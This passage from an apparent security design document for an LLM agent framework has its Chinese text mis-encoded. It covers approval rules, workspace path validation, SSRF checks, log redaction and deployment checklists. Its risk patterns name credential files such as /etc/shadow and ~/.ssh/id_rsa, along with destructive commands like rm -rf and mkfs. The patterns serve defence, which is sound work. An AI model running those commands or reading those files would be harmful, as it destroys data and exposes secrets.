    - "BEGIN (RSA|DSA|EC) PRIVATE KEY"            # PEM æ ¼å¼ç§é’¥
  action: require_approval
  reason: "æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯ï¼ˆå¯†ç /å¯†é’¥/ä»¤ç‰Œï¼‰"
```

**Highï¼ˆé«˜é£é™©ï¼‰** - ç³»ç»Ÿæ–‡ä»¶å’Œå±é™©æ“ä½œï¼š

```yaml
high:
  patterns:
    - "/etc/passwd"                               # ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
    - "/etc/shadow"                               # ç³»ç»Ÿå¯†ç æ–‡ä»¶
    - "~/.ssh/id_rsa"                            # SSH ç§é’¥
    - "~/.aws/credentials"                        # AWS å‡­è¯
    - "DROP\\s+(TABLE|DATABASE)"                  # SQL åˆ é™¤
    - "DELETE\\s+FROM.*WHERE\\s+1=1"             # SQL æ‰¹é‡åˆ é™¤
  action: require_approval
  reason: "æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œï¼ˆç³»ç»Ÿæ–‡ä»¶/æ•°æ®åº“åˆ é™¤ï¼‰"
```

**Mediumï¼ˆä¸­ç­‰é£é™©ï¼‰** - å¯ç–‘æ¨¡å¼ï¼š

```yaml
medium:
  patterns:
    - "https?://[^/]*\\d+\\.\\d+\\.\\d+\\.\\d+"  # IP åœ°å€ URL
    - "\\bexec\\s*\\("                            # ä»£ç æ‰§è¡Œ
    - "\\beval\\s*\\("                            # åŠ¨æ€æ‰§è¡Œ
    - "\\.env$"                                   # ç¯å¢ƒå˜é‡æ–‡ä»¶
  action: require_approval
  reason: "æ£€æµ‹åˆ°å¯ç–‘æ¨¡å¼ï¼ˆä»£ç æ‰§è¡Œ/ç¯å¢ƒå˜é‡ï¼‰"
```

### 2.3 å·¥å…·ç‰¹å®šè§„åˆ™

**run_bash_command** å®¡æ‰¹è§„åˆ™ï¼š

```yaml
run_bash_command:
  enabled: true
  patterns:
    high_risk:
      - "rm\\s+-rf"            # å¼ºåˆ¶åˆ é™¤
      - "sudo"                 # ææƒæ“ä½œ
      - "chmod\\s+777"         # å±é™©æƒé™
      - "mkfs"                 # æ ¼å¼åŒ–ç£ç›˜
      - "dd.*if=/dev/"         # ç£ç›˜å†™å…¥
    medium_risk:
      - "curl"                 # ç½‘ç»œè¯·æ±‚
      - "wget"                 # ä¸‹è½½æ–‡ä»¶
      - "pip\\s+install"       # å®‰è£…åŒ…
  actions:
    high_risk: require_approval
    medium_risk: require_approval
```

**http_fetch** å®¡æ‰¹è§„åˆ™ï¼š

```yaml
http_fetch:
  enabled: true
  rules:
    - pattern: "localhost|127\\.0\\.0\\.1"       # æœ¬åœ°åœ°å€
      action: require_approval
      reason: "è®¿é—®æœ¬åœ°æœåŠ¡"
    - pattern: "192\\.168\\.|10\\."              # å†…ç½‘åœ°å€
      action: require_approval
      reason: "è®¿é—®å†…ç½‘åœ°å€"
```

### 2.4 å®¡æ‰¹ç”¨æˆ·ä½“éªŒ

**æç®€ç‰ˆå®¡æ‰¹ç•Œé¢**ï¼ˆå¯¹ LLM é€æ˜ï¼‰ï¼š

```
ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: run_bash_command
   é£é™©çº§åˆ«: high
   åŸå› : æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œ
   å‘½ä»¤: rm -rf /tmp/cache
   æ‰¹å‡†? [y/n] > n

âŒ æ“ä½œå·²å–æ¶ˆ
```

**å…³é”®è®¾è®¡**ï¼š
- âœ… å®¡æ‰¹å†³ç­–**ä¸è¿›å…¥å¯¹è¯å†å²**ï¼ˆLLM æ— æ„ŸçŸ¥ï¼‰
- âœ… ç”¨æˆ·å¯**æ‰¹å‡†/æ‹’ç»**æ“ä½œ
- âœ… æ‹’ç»å Agent è‡ªåŠ¨è°ƒæ•´ç­–ç•¥
- âœ… å®Œæ•´çš„å®¡æ‰¹æ—¥å¿—è®°å½•

**é…ç½®è·¯å¾„**: `generalAgent/config/hitl_rules.yaml`

---

## 3. å·¥ä½œåŒºéš”ç¦»ä¸æ–‡ä»¶å®‰å…¨

### 3.1 å·¥ä½œåŒºæ¶æ„

æ¯ä¸ªä¼šè¯æ‹¥æœ‰ç‹¬ç«‹çš„æ–‡ä»¶ç³»ç»Ÿæ²™ç®±ï¼š

```
data/workspace/{session_id}/
â”œâ”€â”€ skills/           # ç¬¦å·é“¾æ¥ï¼ˆåªè¯»ï¼‰
â”‚   â””â”€â”€ pdf/
â”‚       â”œâ”€â”€ SKILL.md
â”‚       â””â”€â”€ scripts/
â”œâ”€â”€ uploads/          # ç”¨æˆ·ä¸Šä¼ ï¼ˆå¯è¯»å†™ï¼‰
â”œâ”€â”€ outputs/          # Agent ç”Ÿæˆè¾“å‡ºï¼ˆå¯è¯»å†™ï¼‰
â””â”€â”€ temp/             # ä¸´æ—¶æ–‡ä»¶ï¼ˆå¯è¯»å†™ï¼‰
```

### 3.2 æ–‡ä»¶è®¿é—®å®‰å…¨ç­–ç•¥

| æ“ä½œ | å…è®¸è·¯å¾„ | ç¦æ­¢è·¯å¾„ | éªŒè¯æ–¹å¼ |
|------|---------|---------|---------|
| **è¯»å–** | `workspace/**/*` | `workspace/` å¤–çš„ä»»ä½•è·¯å¾„ | `_validate_workspace_path()` |
| **å†™å…¥** | `outputs/`, `temp/`, `uploads/` | `skills/`, `workspace/` å¤– | `_validate_write_path()` |
| **æ‰§è¡Œ** | `skills/*/scripts/*.py` | å…¶ä»–æ‰€æœ‰è·¯å¾„ | `_validate_script_path()` |
| **åˆ é™¤** | `outputs/`, `temp/` | `skills/`, `uploads/` | `_validate_delete_path()` |

### 3.3 è·¯å¾„å®‰å…¨å®ç°

**è·¯å¾„è§„èŒƒåŒ–**ï¼ˆé˜²æ­¢è·¯å¾„éå†ï¼‰ï¼š

```python
def _validate_workspace_path(self, file_path: str) -> Path:
    """éªŒè¯è·¯å¾„æ˜¯å¦åœ¨ workspace å†…ï¼ˆé˜²æ­¢ ../ æ”»å‡»ï¼‰"""
    # 1. è§£æä¸ºç»å¯¹è·¯å¾„
    abs_path = (self.workspace_path / file_path).resolve()

    # 2. æ£€æŸ¥æ˜¯å¦åœ¨ workspace å†…
    if not abs_path.is_relative_to(self.workspace_path):
        raise SecurityError(f"Path outside workspace: {file_path}")

    # 3. æ£€æŸ¥ç¬¦å·é“¾æ¥ï¼ˆé˜²æ­¢è½¯é“¾æ¥é€ƒé€¸ï¼‰
    if abs_path.is_symlink():
        real_path = abs_path.readlink()
        if not real_path.is_relative_to(self.workspace_path):
            raise SecurityError(f"Symlink escape detected: {file_path}")

    return abs_path
```

**å†™å…¥è·¯å¾„é™åˆ¶**ï¼š

```python
def _validate_write_path(self, file_path: str) -> Path:
    """éªŒè¯å†™å…¥è·¯å¾„ï¼ˆåªå…è®¸ outputs/ã€temp/ã€uploads/ï¼‰"""
    abs_path = self._validate_workspace_path(file_path)

    # å…è®¸çš„å†™å…¥ç›®å½•
    allowed_dirs = ["outputs", "temp", "uploads"]

    # æ£€æŸ¥è·¯å¾„æ˜¯å¦åœ¨å…è®¸çš„ç›®å½•ä¸‹
    relative_path = abs_path.relative_to(self.workspace_path)
    if relative_path.parts[0] not in allowed_dirs:
        raise SecurityError(
            f"Write not allowed: {file_path}. "
            f"Only allowed in: {', '.join(allowed_dirs)}"
        )

    return abs_path
```

### 3.4 æŠ€èƒ½è„šæœ¬æ‰§è¡Œå®‰å…¨

**éš”ç¦»æ‰§è¡Œç¯å¢ƒ**ï¼š

```python
def execute_skill_script(self, script_path: str, args: list[str]) -> str:
    """æ‰§è¡ŒæŠ€èƒ½è„šæœ¬ï¼ˆå—é™ç¯å¢ƒï¼‰"""
    # 1. éªŒè¯è„šæœ¬è·¯å¾„ï¼ˆå¿…é¡»åœ¨ skills/*/scripts/ ä¸‹ï¼‰
    abs_script = self._validate_script_path(script_path)

    # 2. è®¾ç½®ç¯å¢ƒå˜é‡ï¼ˆéš”ç¦»ï¼‰
    env = os.environ.copy()
    env["AGENT_WORKSPACE_PATH"] = str(self.workspace_path)
    env["PYTHONPATH"] = str(self.workspace_path)  # é™åˆ¶ import

    # 3. æ‰§è¡Œè„šæœ¬ï¼ˆè¶…æ—¶ä¿æŠ¤ï¼‰
    result = subprocess.run(
        ["python", abs_script, *args],
        cwd=self.workspace_path,    # é™åˆ¶å·¥ä½œç›®å½•
        env=env,                     # éš”ç¦»ç¯å¢ƒå˜é‡
        timeout=30,                  # è¶…æ—¶é™åˆ¶
        capture_output=True,
        text=True
    )

    return result.stdout
```

---

## 4. ç½‘ç»œå®‰å…¨

### 4.1 HTTP è¯·æ±‚å®‰å…¨ç­–ç•¥

**fetch_web / http_fetch å·¥å…·**å®‰å…¨æ§åˆ¶ï¼š

| é£é™©ç±»å‹ | æ£€æµ‹æ¨¡å¼ | é˜²æŠ¤æªæ–½ |
|---------|---------|---------|
| **å†…ç½‘æ‰«æ** | `localhost`, `127.0.0.1`, `192.168.*`, `10.*` | HITL å®¡æ‰¹ |
| **SSRF æ”»å‡»** | `file://`, `ftp://`, `gopher://` | åè®®ç™½åå•ï¼ˆä»… http/httpsï¼‰ |
| **æ•æ„Ÿç«¯å£** | `:22`, `:3306`, `:5432`, `:6379` | HITL å®¡æ‰¹ |
| **è¶…é•¿ URL** | URL é•¿åº¦ > 2048 | æ‹’ç»è¯·æ±‚ |

**å®ç°ç¤ºä¾‹**ï¼š

```python
def _validate_url(self, url: str) -> None:
    """éªŒè¯ URL å®‰å…¨æ€§"""
    # 1. åè®®ç™½åå•
    if not url.startswith(("http://", "https://")):
        raise SecurityError(f"Invalid protocol: {url}")

    # 2. è§£æ URL
    parsed = urllib.parse.urlparse(url)

    # 3. æ£€æµ‹å†…ç½‘åœ°å€
    ip_pattern = r"\d+\.\d+\.\d+\.\d+"
    if re.match(ip_pattern, parsed.hostname or ""):
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            raise SecurityError(f"Private IP detected: {url}")

    # 4. æ£€æµ‹ localhost
    if parsed.hostname in ("localhost", "127.0.0.1", "::1"):
        raise SecurityError(f"Localhost access denied: {url}")

    # 5. é•¿åº¦é™åˆ¶
    if len(url) > 2048:
        raise SecurityError(f"URL too long: {len(url)} chars")
```

### 4.2 DNS Rebinding é˜²æŠ¤

**é—®é¢˜**ï¼šæ”»å‡»è€…é€šè¿‡ DNS å°†åŸŸåå…ˆè§£æåˆ°å…¬ç½‘ IPï¼ˆé€šè¿‡éªŒè¯ï¼‰ï¼Œå†è§£æåˆ°å†…ç½‘ IPï¼ˆç»•è¿‡é˜²æŠ¤ï¼‰

**é˜²æŠ¤**ï¼š

```python
def fetch_with_dns_rebinding_protection(self, url: str) -> str:
    """é˜² DNS Rebinding çš„ç½‘ç»œè¯·æ±‚"""
    # 1. é¦–æ¬¡ DNS è§£æ
    hostname = urllib.parse.urlparse(url).hostname
    first_ip = socket.gethostbyname(hostname)

    # 2. éªŒè¯ç¬¬ä¸€æ¬¡è§£æçš„ IP
    if ipaddress.ip_address(first_ip).is_private:
        raise SecurityError(f"Private IP detected: {first_ip}")

    # 3. å‘èµ·è¯·æ±‚å‰å†æ¬¡è§£æ
    second_ip = socket.gethostbyname(hostname)

    # 4. éªŒè¯ IP ä¸€è‡´æ€§
    if first_ip != second_ip:
        raise SecurityError(f"DNS rebinding detected: {first_ip} -> {second_ip}")

    # 5. å‘èµ·è¯·æ±‚
    return requests.get(url, timeout=10).text
```

---

## 5. æ•°æ®éšç§ä¿æŠ¤

### 5.1 æœ¬åœ°ä¼˜å…ˆåŸåˆ™

**æ•°æ®å­˜å‚¨ç­–ç•¥**ï¼š

| æ•°æ®ç±»å‹ | å­˜å‚¨ä½ç½® | åŠ å¯† | è®¿é—®æ§åˆ¶ |
|---------|---------|------|---------|
| **ä¼šè¯å†å²** | `data/sessions.db` (SQLite) | âŒ æ˜æ–‡ | æ–‡ä»¶ç³»ç»Ÿæƒé™ |
| **å·¥ä½œåŒºæ–‡ä»¶** | `data/workspace/{session_id}/` | âŒ æ˜æ–‡ | ç›®å½•æƒé™ + è·¯å¾„éš”ç¦» |
| **æ—¥å¿—æ–‡ä»¶** | `logs/` | âŒ æ˜æ–‡ | æ–‡ä»¶ç³»ç»Ÿæƒé™ |
| **é…ç½®æ–‡ä»¶** | `.env`, `*.yaml` | âŒ æ˜æ–‡ | æ–‡ä»¶ç³»ç»Ÿæƒé™ |
| **API Keys** | `.env` (ç¯å¢ƒå˜é‡) | âŒ æ˜æ–‡ | æ–‡ä»¶ç³»ç»Ÿæƒé™ + `.gitignore` |

**å…³é”®åŸåˆ™**ï¼š
- âœ… **æœ¬åœ°å­˜å‚¨** - æ‰€æœ‰æ•°æ®ä¿å­˜åœ¨æœ¬åœ°ï¼Œä¸ä¸Šä¼ äº‘ç«¯
- âœ… **æ–‡ä»¶æƒé™** - ä¾èµ–æ“ä½œç³»ç»Ÿæ–‡ä»¶æƒé™ï¼ˆ`chmod 600`ï¼‰
- âœ… **`.gitignore`** - æ•æ„Ÿæ–‡ä»¶ï¼ˆ`.env`, `data/`, `logs/`ï¼‰æ’é™¤ç‰ˆæœ¬æ§åˆ¶
- âš ï¸ **æ— åŠ å¯†** - å½“å‰ç‰ˆæœ¬ä¸æä¾›é™æ€æ•°æ®åŠ å¯†ï¼ˆæœªæ¥å¯é€‰ï¼‰

### 5.2 æ—¥å¿—è„±æ•

**æ•æ„Ÿä¿¡æ¯è¿‡æ»¤**ï¼š

```python
def sanitize_log_message(self, message: str) -> str:
    """æ—¥å¿—è„±æ•ï¼ˆç§»é™¤æ•æ„Ÿä¿¡æ¯ï¼‰"""
    # 1. API Key è„±æ•
    message = re.sub(
        r"(api[_-]?key['\"]?\s*[:=]\s*['\"]?)[\w-]+",
        r"\1***REDACTED***",
        message,
        flags=re.IGNORECASE
    )

    # 2. Token è„±æ•
    message = re.sub(
        r"(token['\"]?\s*[:=]\s*['\"]?)[\w.-]+",
        r"\1***REDACTED***",
        message,
        flags=re.IGNORECASE
    )

    # 3. Password è„±æ•
    message = re.sub(
        r"(password['\"]?\s*[:=]\s*['\"]?)[\w.-]+",
        r"\1***REDACTED***",
        message,
        flags=re.IGNORECASE
    )

    return message
```

### 5.3 LLM è°ƒç”¨éšç§

**Prompt Token é™åˆ¶**ï¼ˆé˜²æ­¢æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼‰ï¼š

```python
# generalAgent/config/settings.py
class ObservabilitySettings(BaseSettings):
    log_prompt_max_length: int = Field(default=500)  # æ—¥å¿—ä¸­ Prompt æœ€å¤§é•¿åº¦
```

**LangSmith è¿½è¸ª**ï¼ˆå¯é€‰ï¼Œé»˜è®¤å…³é—­ï¼‰ï¼š

```bash
# .env
LANGCHAIN_TRACING_V2=false  # é»˜è®¤å…³é—­ï¼ˆé˜²æ­¢æ•æ„Ÿæ•°æ®ä¸Šä¼ ï¼‰
LANGSMITH_API_KEY=          # ç•™ç©º
```

---

## 6. Prompt å®‰å…¨

### 6.1 Jinja2 æ²™ç®±æ¨¡å¼

**é˜²æ­¢ Prompt æ³¨å…¥æ”»å‡»**ï¼š

```python
from jinja2.sandbox import SandboxedEnvironment

def render_template_safely(template: str, params: dict) -> str:
    """ä½¿ç”¨æ²™ç®±ç¯å¢ƒæ¸²æŸ“æ¨¡æ¿ï¼ˆé˜²æ­¢ä»£ç æ‰§è¡Œï¼‰"""
    # ä½¿ç”¨ SandboxedEnvironmentï¼ˆç¦æ­¢ importã€execã€eval ç­‰ï¼‰
    env = SandboxedEnvironment()

    # æ¸²æŸ“æ¨¡æ¿
    return env.from_string(template).render(**params)
```

**SandboxedEnvironment é™åˆ¶**ï¼š
- âŒ ç¦æ­¢ `{% import ... %}`
- âŒ ç¦æ­¢ `{% exec ... %}`
- âŒ ç¦æ­¢è®¿é—®ç§æœ‰å±æ€§ï¼ˆ`__xxx__`ï¼‰
- âŒ ç¦æ­¢è°ƒç”¨å±é™©å‡½æ•°ï¼ˆ`eval`, `exec`, `compile`ï¼‰

### 6.2 å‚æ•°åŒ– Prompt

**æ¨èæ¨¡å¼**ï¼ˆé˜²æ­¢æ³¨å…¥ï¼‰ï¼š

```python
# âœ… æ¨èï¼šå‚æ•°åŒ–
template = "ä½ æ˜¯ {{ role }}ã€‚ä»»åŠ¡: {{ task }}"
prompt = render_template(template, {"role": user_input, "task": task_desc})

# âŒ ä¸æ¨èï¼šå­—ç¬¦ä¸²æ‹¼æ¥
prompt = f"ä½ æ˜¯ {user_input}ã€‚ä»»åŠ¡: {task_desc}"  # å¯èƒ½è¢«æ³¨å…¥
```

---

## 7. ä¾èµ–å®‰å…¨

### 7.1 Python ä¾èµ–ç®¡ç†

**é”å®šä¾èµ–ç‰ˆæœ¬**ï¼ˆ`uv.lock`ï¼‰ï¼š

```toml
# pyproject.toml
[project.dependencies]
langchain = "^0.3.15"
langgraph = "^0.2.62"
jinja2 = "^3.1.5"
```

**å®‰å…¨æ‰«æ**ï¼ˆæ¨èå·¥å…·ï¼‰ï¼š

```bash
# 1. pip-audit - æ‰«æå·²çŸ¥æ¼æ´
pip-audit

# 2. safety - æ£€æŸ¥ä¸å®‰å…¨çš„ä¾èµ–
safety check

# 3. bandit - é™æ€ä»£ç åˆ†æ
bandit -r generalAgent/
```

### 7.2 æŠ€èƒ½ä¾èµ–éš”ç¦»

**è‡ªåŠ¨ä¾èµ–å®‰è£…**ï¼ˆ`skills/*/requirements.txt`ï¼‰ï¼š

```python
def install_skill_dependencies(self, skill_id: str) -> None:
    """å®‰è£…æŠ€èƒ½ä¾èµ–ï¼ˆéš”ç¦»å®‰è£…ï¼‰"""
    requirements_file = self.skills_path / skill_id / "requirements.txt"

    if requirements_file.exists():
        # ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒéš”ç¦»ï¼ˆå¯é€‰ï¼‰
        subprocess.run([
            "pip", "install", "-r", str(requirements_file),
            "--user",  # ç”¨æˆ·çº§å®‰è£…ï¼ˆéå…¨å±€ï¼‰
        ], check=True)
```

---

## 8. è¿è¡Œæ—¶å®‰å…¨

### 8.1 å¾ªç¯æ§åˆ¶

**é˜²æ­¢æ— é™å¾ªç¯**ï¼š

```bash
# .env
MAX_LOOPS=500  # Agent Loop æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼ˆ1-500ï¼‰
```

```python
# generalAgent/graph/routing.py
def agent_route(state: AppState) -> Literal["tools", "finalize"]:
    """è·¯ç”±å†³ç­–ï¼ˆå¸¦å¾ªç¯ä¿æŠ¤ï¼‰"""
    # æ£€æŸ¥å¾ªç¯æ¬¡æ•°
    if state["loops"] >= state.get("max_loops", 500):
        logger.warning(f"Max loops reached: {state['loops']}")
        return "finalize"  # å¼ºåˆ¶ç»“æŸ

    # æ­£å¸¸è·¯ç”±é€»è¾‘
    ...
```

### 8.2 è¶…æ—¶ä¿æŠ¤

**å·¥å…·æ‰§è¡Œè¶…æ—¶**ï¼š

```python
# run_bash_command å·¥å…·
result = subprocess.run(
    command,
    timeout=30,  # 30 ç§’è¶…æ—¶
    capture_output=True,
    text=True
)
```

**HTTP è¯·æ±‚è¶…æ—¶**ï¼š

```python
# fetch_web å·¥å…·
response = requests.get(url, timeout=10)  # 10 ç§’è¶…æ—¶
```

### 8.3 èµ„æºé™åˆ¶

**å†…å­˜é™åˆ¶**ï¼ˆæ¶ˆæ¯å†å²ï¼‰ï¼š

```bash
# .env
MAX_MESSAGE_HISTORY=500  # æœ€å¤šä¿ç•™ 500 æ¡æ¶ˆæ¯
```

**å·¥ä½œåŒºæ¸…ç†**ï¼š

```bash
# CLI å‘½ä»¤
/clean  # æ¸…ç† 7 å¤©å‰çš„æ—§å·¥ä½œåŒº
```

---

## 9. å®‰å…¨é…ç½®æœ€ä½³å®è·µ

### 9.1 ç”Ÿäº§ç¯å¢ƒé…ç½®

```bash
# .env (ç”Ÿäº§ç¯å¢ƒ)

# ========== å®‰å…¨é…ç½® ==========
# å…³é—­è‡ªåŠ¨å®¡æ‰¹ï¼ˆå¼ºåˆ¶ HITLï¼‰
AUTO_APPROVE_WRITES=false

# é™åˆ¶å¾ªç¯æ¬¡æ•°
MAX_LOOPS=100

# å…³é—­ LangSmith è¿½è¸ªï¼ˆé˜²æ­¢æ•°æ®æ³„éœ²ï¼‰
LANGCHAIN_TRACING_V2=false

# é™åˆ¶ä¸Šä¸‹æ–‡é•¿åº¦ï¼ˆé˜²æ­¢ token æ³„éœ²ï¼‰
CONTEXT_MAX_HISTORY_MESSAGES=100
```

```yaml
# hitl_rules.yaml (ç”Ÿäº§ç¯å¢ƒ)
global:
  enabled: true                    # å¯ç”¨å®¡æ‰¹
  default_action: ask              # é»˜è®¤éœ€å®¡æ‰¹ï¼ˆæ›´ä¸¥æ ¼ï¼‰

  risk_patterns:
    critical:
      patterns:
        - "password"
        - "api_key"
        - "secret"
        - "token"
      action: require_approval
```

### 9.2 å¼€å‘ç¯å¢ƒé…ç½®

```bash
# .env (å¼€å‘ç¯å¢ƒ)

# ========== å¼€å‘é…ç½® ==========
# å¯é€‰å¼€å¯è‡ªåŠ¨å®¡æ‰¹ï¼ˆæé«˜å¼€å‘æ•ˆç‡ï¼‰
AUTO_APPROVE_WRITES=true  # âš ï¸ ä»…å¼€å‘ç¯å¢ƒ

# å¯ç”¨ LangSmith è¿½è¸ªï¼ˆè°ƒè¯•ç”¨ï¼‰
LANGCHAIN_TRACING_V2=true
LANGSMITH_API_KEY=lsv2_xxx
```

```yaml
# hitl_rules.yaml (å¼€å‘ç¯å¢ƒ)
global:
  enabled: false  # âš ï¸ ä»…å¼€å‘ç¯å¢ƒï¼Œç¦ç”¨å®¡æ‰¹åŠ é€Ÿæµ‹è¯•
```

### 9.3 å®‰å…¨æ£€æŸ¥æ¸…å•

**éƒ¨ç½²å‰æ£€æŸ¥**ï¼š

- [ ] `.env` æ–‡ä»¶å·²æ·»åŠ åˆ° `.gitignore`
- [ ] `AUTO_APPROVE_WRITES=false`ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰
- [ ] `LANGCHAIN_TRACING_V2=false`ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰
- [ ] `hitl_rules.yaml` å¯ç”¨å…¨å±€é£é™©æ¨¡å¼
- [ ] `data/` å’Œ `logs/` ç›®å½•å·²æ’é™¤ç‰ˆæœ¬æ§åˆ¶
- [ ] æ–‡ä»¶ç³»ç»Ÿæƒé™æ­£ç¡®ï¼ˆ`chmod 600 .env`ï¼‰
- [ ] ä¾èµ–ç‰ˆæœ¬é”å®šï¼ˆ`uv.lock` å·²æäº¤ï¼‰
- [ ] è¿è¡Œ `pip-audit` æ£€æŸ¥æ¼æ´
- [ ] è¿è¡Œ `bandit` é™æ€åˆ†æ
- [ ] å·¥ä½œåŒºæ¸…ç†ä»»åŠ¡å·²é…ç½®

---

## 10. å®‰å…¨äº‹ä»¶å“åº”

### 10.1 å®¡æ‰¹æ—¥å¿—

**å®¡æ‰¹äº‹ä»¶è®°å½•**ï¼š

```python
# generalAgent/hitl/approval_node.py
logger.warning(
    f"HITL Approval Required: tool={tool_name}, "
    f"risk={decision.risk_level}, reason={decision.reason}"
)
```

**æ—¥å¿—æ ¼å¼**ï¼š

```
2025-10-31 22:00:00 WARNING HITL Approval Required:
  tool=run_bash_command,
  risk=high,
  reason=æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œ
  args={'command': 'rm -rf /tmp/cache'}
  user_decision=rejected
```

### 10.2 å®‰å…¨äº‹ä»¶åˆ†ç±»

| çº§åˆ« | äº‹ä»¶ç±»å‹ | ç¤ºä¾‹ | å“åº”æªæ–½ |
|------|---------|------|---------|
| **Critical** | æ•æ„Ÿä¿¡æ¯æ³„éœ² | API Key å‡ºç°åœ¨æ—¥å¿— | ç«‹å³è½®æ¢å¯†é’¥ + å®¡æŸ¥æ—¥å¿— |
| **High** | ç³»ç»Ÿæ–‡ä»¶è®¿é—® | å°è¯•è¯»å– `/etc/passwd` | HITL æ‹¦æˆª + è®°å½•äº‹ä»¶ |
| **Medium** | å†…ç½‘è¯·æ±‚ | è®¿é—® `192.168.1.1` | HITL å®¡æ‰¹ + ç”¨æˆ·å†³ç­– |
| **Low** | å¾ªç¯è¶…é™ | `loops >= max_loops` | è‡ªåŠ¨ç»“æŸ + æ—¥å¿—è®°å½• |

### 10.3 äº‹ä»¶æº¯æº

**å®¡è®¡æ—¥å¿—æŸ¥è¯¢**ï¼š

```bash
# æŸ¥æ‰¾æ‰€æœ‰å®¡æ‰¹äº‹ä»¶
grep "HITL Approval" logs/*.log

# æŸ¥æ‰¾è¢«æ‹’ç»çš„æ“ä½œ
grep "user_decision=rejected" logs/*.log

# æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯æ£€æµ‹
grep "æ•æ„Ÿä¿¡æ¯" logs/*.log
```

---

## 11. å·²çŸ¥é™åˆ¶ä¸æœªæ¥æ”¹è¿›

### 11.1 å½“å‰é™åˆ¶

| é™åˆ¶ | å½±å“ | ç¼“è§£æªæ–½ |
|------|------|---------|
| **æ— é™æ€æ•°æ®åŠ å¯†** | æœ¬åœ°æ–‡ä»¶å¯è¢«ç›´æ¥è¯»å– | ä¾èµ–æ–‡ä»¶ç³»ç»Ÿæƒé™ |
| **æ— ç½‘ç»œåŠ å¯†** | LLM API è°ƒç”¨ä¾èµ– HTTPS | ä½¿ç”¨å®˜æ–¹ SDKï¼ˆè‡ªåŠ¨ TLSï¼‰ |
| **æ— èº«ä»½è®¤è¯** | å•ç”¨æˆ·ä½¿ç”¨ | å¤šç”¨æˆ·éœ€å¤–éƒ¨é‰´æƒ |
| **æ— è®¿é—®æ§åˆ¶** | æ‰€æœ‰ä¼šè¯å¯è§ | ä¾èµ–æ“ä½œç³»ç»Ÿç”¨æˆ·éš”ç¦» |
| **æ—¥å¿—æ˜æ–‡** | æ•æ„Ÿä¿¡æ¯å¯èƒ½æ³„éœ² | æ—¥å¿—è„±æ• + å®šæœŸæ¸…ç† |

### 11.2 æœªæ¥æ”¹è¿›æ–¹å‘

**çŸ­æœŸï¼ˆv4.0ï¼‰**ï¼š
- [ ] æ—¥å¿—æ•æ„Ÿä¿¡æ¯è‡ªåŠ¨è„±æ•
- [ ] å·¥ä½œåŒºæ–‡ä»¶è‡ªåŠ¨åŠ å¯†ï¼ˆå¯é€‰ï¼‰
- [ ] å®¡æ‰¹äº‹ä»¶å¯¼å‡ºï¼ˆJSON/CSVï¼‰

**ä¸­æœŸï¼ˆv4.5ï¼‰**ï¼š
- [ ] åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰
- [ ] å¤šç§Ÿæˆ·ä¼šè¯éš”ç¦»
- [ ] å®¡è®¡æ—¥å¿—å¯è§†åŒ– Dashboard

**é•¿æœŸï¼ˆv5.0ï¼‰**ï¼š
- [ ] ç«¯åˆ°ç«¯åŠ å¯†ï¼ˆE2EEï¼‰
- [ ] é›¶çŸ¥è¯†è¯æ˜ï¼ˆZKPï¼‰Prompt ä¿æŠ¤
- [ ] è”é‚¦å­¦ä¹ ï¼ˆFederated Learningï¼‰æ”¯æŒ

---

## 12. å®‰å…¨åˆè§„

### 12.1 æ•°æ®ä¿æŠ¤æ³•è§„

**GDPRï¼ˆæ¬§ç›Ÿï¼‰åˆè§„æ€§**ï¼š

| è¦æ±‚ | æ¡†æ¶æ”¯æŒ | è¯´æ˜ |
|------|---------|------|
| **æ•°æ®æœ€å°åŒ–** | âœ… | æœ¬åœ°å­˜å‚¨ï¼Œä¸ä¸Šä¼ äº‘ç«¯ |
| **è®¿é—®æƒåˆ©** | âœ… | ç”¨æˆ·å¯ç›´æ¥è®¿é—® `data/` ç›®å½• |
| **åˆ é™¤æƒåˆ©** | âœ… | `/reset` å‘½ä»¤åˆ é™¤ä¼šè¯ |
| **æ•°æ®ä¾¿æºæ€§** | âœ… | SQLite æ•°æ®åº“å¯å¯¼å‡º |
| **åŠ å¯†è¦æ±‚** | âš ï¸ | å½“å‰æ— é™æ€åŠ å¯†ï¼ˆå¯é€‰ï¼‰ |

**CCPAï¼ˆåŠ å·ï¼‰åˆè§„æ€§**ï¼š

| è¦æ±‚ | æ¡†æ¶æ”¯æŒ | è¯´æ˜ |
|------|---------|------|
| **çŸ¥æƒ…æƒ** | âœ… | æœ¬åœ°å­˜å‚¨ï¼Œç”¨æˆ·å®Œå…¨å¯è§ |
| **åˆ é™¤æƒ** | âœ… | `/reset` æˆ–åˆ é™¤ `data/` |
| **é€‰æ‹©é€€å‡º** | âœ… | ä¸æ”¶é›†é¥æµ‹æ•°æ® |

### 12.2 ä¼ä¸šå®‰å…¨æ ‡å‡†

**SOC 2 Type II** è€ƒè™‘ï¼š

- âœ… **è®¿é—®æ§åˆ¶**: æ–‡ä»¶ç³»ç»Ÿæƒé™
- âœ… **å®¡è®¡æ—¥å¿—**: å®Œæ•´çš„å®¡æ‰¹å’Œæ“ä½œæ—¥å¿—
- âœ… **æ•°æ®éš”ç¦»**: å·¥ä½œåŒºéš”ç¦»æœºåˆ¶
- âš ï¸ **åŠ å¯†**: å½“å‰æ— é™æ€æ•°æ®åŠ å¯†
- âš ï¸ **èº«ä»½éªŒè¯**: ä¾èµ–å¤–éƒ¨ç³»ç»Ÿ

---

## 13. å®‰å…¨è”ç³»æ–¹å¼

**å®‰å…¨æ¼æ´æŠ¥å‘Š**ï¼š
- é‚®ç®±: `security@example.com`ï¼ˆè¯·æ›¿æ¢ä¸ºå®é™…é‚®ç®±ï¼‰
- GitHub: [Security Advisory](https://github.com/your-org/agentsgraph/security/advisories)

**è´Ÿè´£ä»»çš„æŠ«éœ²æ”¿ç­–**ï¼š
